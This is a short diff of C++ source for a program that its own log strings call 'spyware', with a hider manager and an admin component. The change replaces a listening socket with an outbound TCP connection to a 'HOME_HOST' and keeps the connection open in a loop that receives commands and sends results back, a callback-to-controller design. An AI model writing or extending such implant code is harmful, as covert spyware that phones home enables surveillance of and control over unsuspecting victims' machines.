@@ -24,23 +24,14 @@ int main() {
     
     HiderManeger& hiderManeger = HiderManeger::getInstance();
     ContraptionAdmin admin;
-    // admin.segTest();
-    Listener listener = Listener(PORT);
-    // admin.segTest();
-
+    std::shared_ptr<Connection> conn;
+    
+    if (Connection::connectTCP(HOME_HOST, PORT, conn) != SUCCSESS) {
+        exit(EXIT_FAILURE);
+    }
     bool cont = true;
     while (cont)
     {
-        // admin.segTest();
-        std::shared_ptr<Connection> conn;
-        // TODO add error strtegy
-        if (listener.acceptConnection(conn) == -1) {
-            std::cerr << "listener.acceptConnection(conn) failed" << std::endl;
-            sleep(10);
-            continue;
-        }
-        // admin.segTest();
-
         loopIter(conn, hiderManeger, admin);
         std::cerr << "spyware: compleated loop iter\n";
     }
@@ -89,5 +80,4 @@ void loopIter(std::shared_ptr<Connection> conn, HiderManeger& hiderManeger, Cont
     std::cerr << "Spyware:  Conn: res-" << stat << " response-\n" << strRes << std::endl;
     conn->sendResponce(stat, strRes);
     std::cerr << "responce sent" << std::endl;
-    conn->closeConn();
 }
